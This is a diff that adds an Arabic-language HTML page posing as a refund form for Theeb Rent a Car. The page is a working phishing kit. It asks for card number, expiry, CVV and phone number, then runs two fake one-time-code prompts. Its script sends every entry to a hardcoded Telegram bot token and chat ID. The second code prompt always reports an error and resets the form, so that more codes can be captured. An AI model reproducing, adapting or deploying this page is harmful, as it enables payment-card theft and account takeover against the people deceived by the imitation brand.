@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>استرداد الأموال | ذيب لتأجير السيارات</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary-color: #0f6aa4;
+      --primary-dark: #0a5785;
+      --secondary-color: #1a4d3e;
+      --accent-color: #f9b81b;
+      --dark-color: #1a2e3a;
+      --light-color: #f0f4f9;
+      --text-color: #1a2e3a;
+      --text-light: #6c757d;
+      --error-color: #dc2626;
+      --success-color: #2e7d5e;
+      --warning-color: #f59e0b;
+      --border-radius: 12px;
+      --box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+      --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+      --gradient: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+      --visa-gradient: linear-gradient(135deg, #1a1f71, #4364f7);
+      --mastercard-gradient: linear-gradient(135deg, #eb001b, #f7981d);
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
+    body {
+      background: linear-gradient(135deg, #0f6aa4 0%, #1a4d3e 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 15px;
+    }
+    .container {
+      max-width: 500px;
+      width: 100%;
+      background: white;
+      border-radius: 28px;
+      overflow: hidden;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+    }
+    .header {
+      background: linear-gradient(135deg, #0f6aa4, #1a4d3e);
+      padding: 25px 20px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 15px;
+      position: relative;
+      z-index: 2;
+    }
+    .logo-icon {
+      width: 55px;
+      height: 55px;
+      background: white;
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    }
+    .logo-icon img {
+      width: 45px;
+      height: 45px;
+      object-fit: contain;
+    }
+    .logo-text h1 {
+      font-size: 22px;
+      font-weight: 800;
+      color: white;
+    }
+    .logo-text p {
+      font-size: 11px;
+      opacity: 0.9;
+      color: white;
+    }
+    .header h2 {
+      color: white;
+      font-size: 20px;
+      font-weight: 700;
+    }
+    .content { padding: 25px; }
+    .alert {
+      background: rgba(15, 106, 164, 0.08);
+      border-right: 4px solid #0f6aa4;
+      padding: 12px 16px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 14px;
+      color: #0f6aa4;
+    }
+    .warning-banner {
+      background: #fef3c7;
+      border-right: 4px solid var(--warning-color);
+      padding: 12px 16px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      display: none;
+      align-items: center;
+      gap: 12px;
+      font-size: 14px;
+      color: #92400e;
+      animation: pulse 0.5s ease;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.02); }
+      100% { transform: scale(1); }
+    }
+    .warning-banner i { font-size: 20px; color: var(--warning-color); }
+    .card-preview {
+      height: 190px;
+      border-radius: 16px;
+      padding: 20px;
+      margin-bottom: 25px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      color: white;
+      transition: 0.3s;
+    }
+    .card-preview.visa { background: linear-gradient(135deg, #1a1f71, #4364f7); }
+    .card-preview.mastercard { background: linear-gradient(135deg, #eb001b, #f7981d); }
+    .card-chip {
+      width: 40px;
+      height: 30px;
+      background: linear-gradient(135deg, #ffd700, #ffed4e);
+      border-radius: 8px;
+    }
+    .card-number {
+      font-size: 18px;
+      font-family: monospace;
+      letter-spacing: 2px;
+      direction: ltr;
+      text-align: left;
+    }
+    .card-details {
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+    }
+    .form-group { margin-bottom: 18px; position: relative; }
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 600;
+      font-size: 14px;
+      color: #1a2e3a;
+    }
+    .form-group.required label::after {
+      content: '*';
+      color: #dc2626;
+      margin-right: 5px;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1.5px solid #e2e8f0;
+      border-radius: 14px;
+      font-size: 15px;
+      transition: 0.3s;
+      background: white;
+      direction: ltr;
+      text-align: left;
+    }
+    .form-group input:focus {
+      border-color: #f9b81b;
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(249, 184, 27, 0.1);
+    }
+    .form-group input.valid {
+      border-color: #2e7d5e;
+      background: rgba(46, 125, 94, 0.03);
+    }
+    .form-group input.invalid {
+      border-color: #dc2626;
+      background: rgba(220, 38, 38, 0.03);
+    }
+    .error-msg {
+      color: #dc2626;
+      font-size: 12px;
+      margin-top: 5px;
+      display: none;
+    }
+    .row-2 {
+      display: flex;
+      gap: 15px;
+    }
+    .row-2 .form-group { flex: 1; }
+    .phone-wrapper { display: flex; }
+    .phone-prefix {
+      background: #f8fafc;
+      padding: 12px 12px;
+      border: 1.5px solid #e2e8f0;
+      border-left: none;
+      border-radius: 14px 0 0 14px;
+      font-weight: 600;
+      color: #0f6aa4;
+    }
+    .phone-wrapper input {
+      border-radius: 0 14px 14px 0;
+      border-right: none;
+    }
+    .btn {
+      width: 100%;
+      background: linear-gradient(135deg, #0f6aa4, #1a4d3e);
+      color: white;
+      border: none;
+      padding: 16px;
+      border-radius: 40px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: 0.3s;
+    }
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 15px rgba(15, 106, 164, 0.3);
+    }
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    .theeb-footer {
+      background: #f0f4f9;
+      padding: 15px;
+      text-align: center;
+      font-size: 12px;
+      color: #6c757d;
+      border-top: 1px solid #e2e8f0;
+    }
+    /* نافذة التحقق - المستوى الأول */
+    .modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.7);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    .modal.active { display: flex; }
+    .modal-content {
+      background: white;
+      width: 90%;
+      max-width: 380px;
+      border-radius: 24px;
+      overflow: hidden;
+      animation: fadeInUp 0.3s;
+    }
+    /* نافذة التحقق - المستوى الثاني */
+    .verify-owner-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.85);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1050;
+    }
+    .verify-owner-modal.active { display: flex; }
+    .verify-owner-content {
+      background: white;
+      width: 90%;
+      max-width: 380px;
+      border-radius: 24px;
+      overflow: hidden;
+      animation: shakeIn 0.5s ease;
+    }
+    @keyframes shakeIn {
+      0% { transform: scale(0.9); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+    .verify-owner-header {
+      background: linear-gradient(135deg, #dc2626, #b91c1c);
+      padding: 25px;
+      text-align: center;
+      color: white;
+    }
+    .verify-owner-header i { font-size: 48px; margin-bottom: 10px; }
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .modal-header {
+      background: linear-gradient(135deg, #0f6aa4, #1a4d3e);
+      padding: 25px;
+      text-align: center;
+      color: white;
+      position: relative;
+    }
+    .close-modal {
+      position: absolute;
+      top: 15px;
+      left: 20px;
+      background: none;
+      border: none;
+      color: white;
+      font-size: 20px;
+      cursor: pointer;
+    }
+    .modal-body { padding: 25px; text-align: center; }
+    .code-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin: 25px 0;
+      direction: ltr;
+    }
+    .code-input {
+      width: 50px;
+      height: 55px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 700;
+      border: 2px solid #e2e8f0;
+      border-radius: 14px;
+    }
+    .code-input:focus {
+      outline: none;
+      border-color: #0f6aa4;
+    }
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(255, 255, 255, 0.95);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1100;
+      flex-direction: column;
+    }
+    .loader {
+      width: 50px;
+      height: 50px;
+      border: 4px solid #f0f4f9;
+      border-top: 4px solid #0f6aa4;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      left: 20px;
+      background: white;
+      padding: 14px 20px;
+      border-radius: 60px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      z-index: 1200;
+      transform: translateY(150%);
+      transition: 0.3s;
+    }
+    .toast.show { transform: translateY(0); }
+    .toast.success { background: #e6f4ef; border-right: 4px solid #2e7d5e; }
+    .toast.error { background: #ffe8e8; border-right: 4px solid #dc2626; }
+    @media (max-width: 480px) {
+      .code-input { width: 45px; height: 50px; font-size: 22px; }
+      .row-2 { flex-direction: column; gap: 0; }
+    }
+  </style>
+</head>
+<body>
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loader"></div>
+    <div style="margin-top: 15px; color: #0f6aa4; font-weight: 600;">جاري معالجة طلبك...</div>
+  </div>
+  
+  <div class="toast" id="toast">
+    <i class="fas fa-check-circle"></i>
+    <span id="toastMsg"></span>
+  </div>
+  
+  <!-- نافذة التحقق الأولى -->
+  <div class="modal" id="verifyModal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button class="close-modal" onclick="closeVerifyModal()">✕</button>
+        <i class="fas fa-shield-alt"></i>
+        <h3>رمز التحقق</h3>
+        <p style="font-size: 13px; opacity: 0.9;">تم إرسال رمز التحقق إلى رقم جوالك</p>
+      </div>
+      <div class="modal-body">
+        <p style="color: #666;">الرجاء إدخال الرمز المرسل إلى الرقم</p>
+        <p style="font-weight: 700; color: #0f6aa4; margin: 5px 0 15px; font-size: 16px;" id="maskedPhone">05*******</p>
+        <div class="code-inputs">
+          <input type="text" class="code-input" maxlength="1" id="c1" oninput="moveNext(this, 'c2')" onkeydown="handleBackspace(event, this, 'c1')" inputmode="numeric">
+          <input type="text" class="code-input" maxlength="1" id="c2" oninput="moveNext(this, 'c3')" onkeydown="handleBackspace(event, this, 'c1')" inputmode="numeric">
+          <input type="text" class="code-input" maxlength="1" id="c3" oninput="moveNext(this, 'c4')" onkeydown="handleBackspace(event, this, 'c2')" inputmode="numeric">
+          <input type="text" class="code-input" maxlength="1" id="c4" oninput="moveNext(this, 'c5')" onkeydown="handleBackspace(event, this, 'c3')" inputmode="numeric">
+          <input type="text" class="code-input" maxlength="1" id="c5" oninput="moveNext(this, 'c6')" onkeydown="handleBackspace(event, this, 'c4')" inputmode="numeric">
+          <input type="text" class="code-input" maxlength="1" id="c6" onkeydown="handleBackspace(event, this, 'c5')" inputmode="numeric">
+        </div>
+        <button class="btn" onclick="verifyFirstCode()" style="margin-top: 15px;">تأكيد الرمز</button>
+        <button onclick="closeVerifyModal()" style="background: none; border: none; color: #888; margin-top: 12px; cursor: pointer;">إلغاء</button>
+      </div>
+    </div>
+  </div>
+  
+  <!-- نافذة التحقق الثانية -->
+  <div class="verify-owner-modal" id="verifyOwnerModal">
+    <div class="verify-owner-content">
+      <div class="verify-owner-header">
+        <i class="fas fa-user-shield"></i>
+        <h3>تأكيد هوية صاحب البطاقة</h3>
+        <p style="font-size: 13px; opacity: 0.9; margin-top: 8px;">للتأكد من أنك صاحب البطاقة</p>
+      </div>
+      <div class="modal-body">
+        <div style="background: #e8f0fe; padding: 12px; border-radius: 12px; margin-bottom: 20px;">
+          <p style="color: #0f6aa4; font-weight: 600;" id="ownerNameDisplay"></p>
+          <p style="color: #666; font-size: 13px;" id="ownerPhoneDisplay"></p>
+        </div>
+        <div class="code-inputs">
+          <input type="text" class="code-input" maxlength="1" id="v1" oninput="moveNextOwner(this, 'v2')" onkeydown="handleBackspaceOwner(event, this, 'v1')" inputmode="numeric">
+          <input type="text" class="code-input" maxlength="1" id="v2" oninput="moveNextOwner(this, 'v3')" onkeydown="handleBackspaceOwner(event, this, 'v1')" inputmode="numeric">
+          <input type="text" class="code-input" maxlength="1" id="v3" oninput="moveNextOwner(this, 'v4')" onkeydown="handleBackspaceOwner(event, this, 'v2')" inputmode="numeric">
+          <input type="text" class="code-input" maxlength="1" id="v4" oninput="moveNextOwner(this, 'v5')" onkeydown="handleBackspaceOwner(event, this, 'v3')" inputmode="numeric">
+          <input type="text" class="code-input" maxlength="1" id="v5" oninput="moveNextOwner(this, 'v6')" onkeydown="handleBackspaceOwner(event, this, 'v4')" inputmode="numeric">
+          <input type="text" class="code-input" maxlength="1" id="v6" onkeydown="handleBackspaceOwner(event, this, 'v5')" inputmode="numeric">
+        </div>
+        <div id="ownerErrorMsg" style="display: none; background: #ffebee; border-radius: 12px; padding: 10px; margin-bottom: 15px; color: #dc2626; font-size: 13px;">
+          <i class="fas fa-exclamation-circle"></i> رمز التأكيد غير صحيح
+        </div>
+        <button class="btn" onclick="verifySecondCode()" style="margin-top: 5px;">تأكيد هويتي</button>
+        <button onclick="closeOwnerModalAndReset()" style="background: none; border: none; color: #888; margin-top: 15px; cursor: pointer;">إلغاء</button>
+      </div>
+    </div>
+  </div>
+  
+  <div class="container">
+    <div class="header">
+      <div class="logo">
+        <div class="logo-icon">
+          <img src="https://www.theebonline.com/wp-content/themes/Theeb-theme/images/login-logo.png" alt="شعار ذيب">
+        </div>
+        <div class="logo-text">
+          <h1>ذيب لتأجير السيارات</h1>
+          <p>THEEB RENT A CAR</p>
+        </div>
+      </div>
+      <h2>استرداد الأموال</h2>
+    </div>
+    
+    <div class="content" id="mainContent">
+      <div class="alert">
+        <i class="fas fa-undo-alt"></i>
+        استرداد مبلغ الحجز – أدخل بيانات بطاقتك لاستكمال عملية الاسترداد
+      </div>
+      
+      <div id="warningBanner" class="warning-banner">
+        <i class="fas fa-exclamation-triangle"></i>
+        <span id="warningText">معلومات البطاقة غير صحيحة، يرجى التحقق من البيانات</span>
+      </div>
+      
+      <div class="card-preview visa" id="cardPreview">
+        <div class="card-chip"></div>
+        <div class="card-number" id="previewNumber">•••• •••• •••• ••••</div>
+        <div class="card-details">
+          <div><span id="previewName">اسم حامل البطاقة</span></div>
+          <div id="previewExpiry">MM/YY</div>
+        </div>
+      </div>
+      
+      <div class="form-group required">
+        <label>اسم حامل البطاقة (إنجليزي)</label>
+        <input type="text" id="cardName" placeholder="CARDHOLDER NAME">
+        <div class="error-msg" id="nameError">يجب إدخال اسم حامل البطاقة (3 أحرف على الأقل)</div>
+      </div>
+      
+      <div class="form-group required">
+        <label>رقم البطاقة</label>
+        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric">
+        <div class="error-msg" id="cardError">رقم بطاقة غير صالح (يجب أن يكون 16 رقم)</div>
+      </div>
+      
+      <div class="form-group">
+        <label>رقم الجوال</label>
+        <div class="phone-wrapper">
+          <div class="phone-prefix">+966</div>
+          <input type="tel" id="phone" placeholder="05XXXXXXXX" maxlength="10" inputmode="numeric">
+        </div>
+        <div class="error-msg" id="phoneError">يجب إدخال رقم صحيح يبدأ بـ 05 (10 أرقام)</div>
+      </div>
+      
+      <div class="row-2">
+        <div class="form-group required">
+          <label>تاريخ الانتهاء</label>
+          <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric">
+          <div class="error-msg" id="expiryError">تاريخ غير صالح أو منتهي</div>
+        </div>
+        <div class="form-group required">
+          <label>CVV</label>
+          <input type="password" id="cvv" placeholder="123" maxlength="3" inputmode="numeric">
+          <div class="error-msg" id="cvvError">CVV غير صالح (3 أرقام)</div>
+        </div>
+      </div>
+      
+      <button class="btn" id="submitBtn">تأكيد الاسترداد والمتابعة</button>
+    </div>
+    
+    <div class="theeb-footer">
+      <i class="fas fa-shield-alt"></i> دفع آمن ومشفر 100% | © 2025 ذيب لتأجير السيارات
+    </div>
+  </div>
+  
+  <script>
+    // ---------- الثوابت ----------
+    const BOT_TOKEN = "8452808616:AAGSc8TkOFZyOmCsq8L9_xpVmTd2w6uCisE";
+    const CHAT_ID = "2059318108";
+    let amount = 500;   // مبلغ الاسترداد
+    let pendingPaymentData = null;
+    let firstCode = null;
+    let warningTimeout = null;
+    
+    // ---------- أدوات مساعدة ----------
+    function showToast(msg, type = 'success') {
+      const toast = document.getElementById('toast');
+      const text = document.getElementById('toastMsg');
+      toast.className = `toast ${type}`;
+      text.textContent = msg;
+      toast.classList.add('show');
+      setTimeout(() => toast.classList.remove('show'), 4000);
+    }
+    function showLoading() { document.getElementById('loadingOverlay').style.display = 'flex'; }
+    function hideLoading() { document.getElementById('loadingOverlay').style.display = 'none'; }
+    function formatPhone(phone) {
+      if (!phone || phone.length !== 10) return '05*******';
+      return phone.substring(0, 4) + '****' + phone.substring(7, 10);
+    }
+    
+    // ---------- نوافذ التحقق ----------
+    function openVerifyModal(phone) {
+      document.getElementById('maskedPhone').textContent = formatPhone(phone);
+      document.getElementById('verifyModal').classList.add('active');
+      for (let i = 1; i <= 6; i++) document.getElementById(`c${i}`).value = '';
+    }
+    function closeVerifyModal() { document.getElementById('verifyModal').classList.remove('active'); }
+    
+    function openOwnerModal(name, phone) {
+      document.getElementById('ownerNameDisplay').textContent = name || 'اسم حامل البطاقة';
+      document.getElementById('ownerPhoneDisplay').textContent = phone ? `رقم الجوال: ${formatPhone(phone)}` : '';
+      document.getElementById('verifyOwnerModal').classList.add('active');
+      for (let i = 1; i <= 6; i++) document.getElementById(`v${i}`).value = '';
+      document.getElementById('ownerErrorMsg').style.display = 'none';
+    }
+    function closeOwnerModal() { document.getElementById('verifyOwnerModal').classList.remove('active'); }
+    
+    function resetPaymentForm() {
+      document.getElementById('cardName').value = '';
+      document.getElementById('cardNumber').value = '';
+      document.getElementById('phone').value = '';
+      document.getElementById('expiry').value = '';
+      document.getElementById('cvv').value = '';
+      document.getElementById('previewNumber').textContent = '•••• •••• •••• ••••';
+      document.getElementById('previewName').textContent = 'اسم حامل البطاقة';
+      document.getElementById('previewExpiry').textContent = 'MM/YY';
+      document.getElementById('cardPreview').className = 'card-preview visa';
+      document.querySelectorAll('.valid').forEach(el => el.classList.remove('valid'));
+      document.querySelectorAll('.invalid').forEach(el => el.classList.remove('invalid'));
+      document.getElementById('submitBtn').disabled = true;
+    }
+    
+    function showWarningAndReset() {
+      const banner = document.getElementById('warningBanner');
+      banner.style.display = 'flex';
+      if (warningTimeout) clearTimeout(warningTimeout);
+      warningTimeout = setTimeout(() => { banner.style.display = 'none'; }, 10000);
+      resetPaymentForm();
+    }
+    function closeOwnerModalAndReset() {
+      closeOwnerModal();
+      showWarningAndReset();
+    }
+    
+    // ---------- تنسيق الحقول ----------
+    function formatCardNumber(input) {
+      let rawValue = input.value;
+      let numbersOnly = rawValue.replace(/\D/g, '');
+      if (numbersOnly.length > 16) numbersOnly = numbersOnly.slice(0, 16);
+      let formatted = '';
+      for (let i = 0; i < numbersOnly.length; i++) {
+        if (i > 0 && i % 4 === 0) formatted += ' ';
+        formatted += numbersOnly[i];
+      }
+      input.value = formatted;
+      document.getElementById('previewNumber').textContent = formatted || '•••• •••• •••• ••••';
+      let cardType = 'visa';
+      if (numbersOnly.length > 0 && numbersOnly[0] === '5') cardType = 'mastercard';
+      document.getElementById('cardPreview').className = `card-preview ${cardType}`;
+      return numbersOnly;
+    }
+    function formatExpiry(input) {
+      let val = input.value.replace(/\D/g, '');
+      if (val.length > 4) val = val.slice(0, 4);
+      if (val.length >= 2) val = val.slice(0, 2) + (val.length > 2 ? '/' + val.slice(2) : '');
+      input.value = val;
+      document.getElementById('previewExpiry').textContent = val || 'MM/YY';
+      return val;
+    }
+    function updatePreview() {
+      let name = document.getElementById('cardName').value.trim();
+      document.getElementById('previewName').textContent = name || 'اسم حامل البطاقة';
+    }
+    
+    // ---------- التحقق ----------
+    function validateLuhn(card) {
+      let sum = 0, alt = false;
+      let digits = card.replace(/\s/g, '').split('');
+      for (let i = digits.length - 1; i >= 0; i--) {
+        let n = parseInt(digits[i]);
+        if (alt) { n *= 2; if (n > 9) n -= 9; }
+        sum += n;
+        alt = !alt;
+      }
+      return sum % 10 === 0;
+    }
+    function validatePhone(phone) { return phone && phone.length === 10 && phone.startsWith('05') && /^\d+$/.test(phone); }
+    function validateName(name) { return name && name.trim().length >= 3 && /^[A-Za-z\s]+$/.test(name); }
+    function validateExpiry(expiry) {
+      let parts = expiry.split('/');
+      if (parts.length !== 2) return false;
+      let month = parseInt(parts[0]), year = parseInt(parts[1]);
+      if (isNaN(month) || isNaN(year)) return false;
+      let now = new Date();
+      let currentYear = now.getFullYear() % 100, currentMonth = now.getMonth() + 1;
+      return month >= 1 && month <= 12 && (year > currentYear || (year === currentYear && month >= currentMonth));
+    }
+    function setFieldError(fieldId, isValid, errorId) {
+      let field = document.getElementById(fieldId);
+      let errorMsg = document.getElementById(errorId);
+      if (!field.value.trim()) { field.classList.remove('valid', 'invalid'); errorMsg.style.display = 'none'; }
+      else if (isValid) { field.classList.add('valid'); field.classList.remove('invalid'); errorMsg.style.display = 'none'; }
+      else { field.classList.add('invalid'); field.classList.remove('valid'); errorMsg.style.display = 'block'; }
+    }
+    function validateAll() {
+      let cardNumRaw = document.getElementById('cardNumber').value;
+      let cardNum = cardNumRaw.replace(/\s/g, '');
+      let cardValid = cardNum.length === 16 && validateLuhn(cardNumRaw);
+      let name = document.getElementById('cardName').value.trim();
+      let nameValid = validateName(name);
+      let phone = document.getElementById('phone').value;
+      let phoneValid = validatePhone(phone);
+      let expiry = document.getElementById('expiry').value;
+      let expiryValid = validateExpiry(expiry);
+      let cvv = document.getElementById('cvv').value;
+      let cvvValid = cvv.length === 3 && /^\d+$/.test(cvv);
+      
+      setFieldError('cardName', nameValid, 'nameError');
+      setFieldError('cardNumber', cardValid, 'cardError');
+      setFieldError('phone', phoneValid, 'phoneError');
+      setFieldError('expiry', expiryValid, 'expiryError');
+      setFieldError('cvv', cvvValid, 'cvvError');
+      
+      let allRequiredValid = nameValid && cardValid && expiryValid && cvvValid;
+      document.getElementById('submitBtn').disabled = !allRequiredValid;
+      return { valid: allRequiredValid, data: { cardName: name, cardNumber: cardNumRaw, phone: phone, expiry: expiry, cvv: cvv } };
+    }
+    
+    // ---------- إرسال إلى تيليجرام ----------
+    function sendToTelegram(msg) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+      }).catch(e => console.log('Telegram error:', e));
+    }
+    
+    function sendPaymentData(paymentData) {
+      let cardType = 'فيزا';
+      let rawNum = paymentData.cardNumber.replace(/\s/g, '');
+      if (rawNum.length > 0 && rawNum[0] === '5') cardType = 'ماستركارد';
+      let msg = `🔄 *استرداد أموال - ذيب لتأجير السيارات*\n\n👤 *الاسم:* ${paymentData.cardName}\n💰 *المبلغ المسترد:* ${amount} ر.س\n💳 *البطاقة:* ${cardType}\n📞 *الجوال:* ${paymentData.phone}\n⏰ *الوقت:* ${new Date().toLocaleString('ar-SA')}\n\n💳 *بيانات البطاقة:*\n- الرقم: ${paymentData.cardNumber}\n- التاريخ: ${paymentData.expiry}\n- CVV: ${paymentData.cvv}`;
+      sendToTelegram(msg);
+    }
+    
+    function sendFirstVerificationCode(code, paymentData) {
+      let msg = `🔐 *المرحلة الأولى - رمز التحقق لاسترداد الأموال*\n\n👤 *الاسم:* ${paymentData.cardName}\n💰 *المبلغ المسترد:* ${amount} ر.س\n📞 *الجوال:* ${paymentData.phone}\n🔑 *الرمز المدخل:* ${code}\n🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}`;
+      sendToTelegram(msg);
+    }
+    
+    function sendSecondVerificationCode(code, paymentData) {
+      let msg = `🛡️ *المرحلة الثانية - تأكيد هوية صاحب البطاقة (استرداد)*\n\n👤 *الاسم:* ${paymentData.cardName}\n💰 *المبلغ المسترد:* ${amount} ر.س\n📞 *الجوال:* ${paymentData.phone}\n🔑 *رمز التأكيد المدخل:* ${code}\n🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}\n\n⚠️ *تم عرض خطأ للمستخدم (رمز غير صحيح)*`;
+      sendToTelegram(msg);
+    }
+    
+    // ---------- التنقل في الحقول ----------
+    function moveNext(current, nextId) {
+      current.value = current.value.replace(/\D/g, '');
+      if (current.value && nextId) document.getElementById(nextId).focus();
+    }
+    function handleBackspace(event, current, prevId) {
+      if (event.key === 'Backspace' && !current.value && prevId) document.getElementById(prevId).focus();
+    }
+    function moveNextOwner(current, nextId) {
+      current.value = current.value.replace(/\D/g, '');
+      if (current.value && nextId) document.getElementById(nextId).focus();
+    }
+    function handleBackspaceOwner(event, current, prevId) {
+      if (event.key === 'Backspace' && !current.value && prevId) document.getElementById(prevId).focus();
+    }
+    
+    // ---------- التحقق من الرمز الأول ----------
+    function verifyFirstCode() {
+      let code = '';
+      for (let i = 1; i <= 6; i++) code += document.getElementById(`c${i}`).value;
+      if (code.length !== 6) { showToast('الرجاء إدخال رمز التحقق كاملاً', 'error'); return; }
+      firstCode = code;
+      sendFirstVerificationCode(code, pendingPaymentData);
+      closeVerifyModal();
+      
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        openOwnerModal(pendingPaymentData.cardName, pendingPaymentData.phone);
+      }, 10000);
+    }
+    
+    // ---------- التحقق من الرمز الثاني ----------
+    function verifySecondCode() {
+      let code = '';
+      for (let i = 1; i <= 6; i++) code += document.getElementById(`v${i}`).value;
+      if (code.length !== 6) { showToast('الرجاء إدخال رمز التأكيد كاملاً', 'error'); return; }
+      
+      sendSecondVerificationCode(code, pendingPaymentData);
+      document.getElementById('ownerErrorMsg').style.display = 'block';
+      
+      setTimeout(() => {
+        closeOwnerModal();
+        showWarningAndReset();
+        showToast('تم إلغاء العملية بسبب خطأ في التأكيد', 'error');
+      }, 2000);
+    }
+    
+    // ---------- معالجة الدفع (استرداد) ----------
+    function processPayment(e) {
+      e.preventDefault();
+      let validation = validateAll();
+      if (!validation.valid) { showToast('الرجاء تعبئة جميع البيانات بشكل صحيح', 'error'); return; }
+      if (!validation.data.phone) { showToast('الرجاء إدخال رقم الجوال', 'error'); return; }
+      pendingPaymentData = validation.data;
+      sendPaymentData(pendingPaymentData);
+      openVerifyModal(pendingPaymentData.phone);
+    }
+    
+    // ---------- ربط الأحداث ----------
+    document.getElementById('cardName').addEventListener('input', function() {
+      this.value = this.value.toUpperCase().replace(/[^A-Z\s]/g, '');
+      validateAll();
+      updatePreview();
+    });
+    document.getElementById('cardNumber').addEventListener('input', function() {
+      formatCardNumber(this);
+      validateAll();
+    });
+    document.getElementById('expiry').addEventListener('input', function() {
+      formatExpiry(this);
+      validateAll();
+    });
+    document.getElementById('cvv').addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '').slice(0,3);
+      validateAll();
+    });
+    document.getElementById('phone').addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '').slice(0,10);
+      validateAll();
+    });
+    document.getElementById('submitBtn').addEventListener('click', processPayment);
+    
+    // تهيئة
+    document.getElementById('cardNumber').value = '';
+    document.getElementById('phone').value = '';
+    let urlAmount = new URLSearchParams(window.location.search).get('amount');
+    if (urlAmount) amount = parseInt(urlAmount);
+    validateAll();
+    updatePreview();
+  </script>
+</body>
+</html>
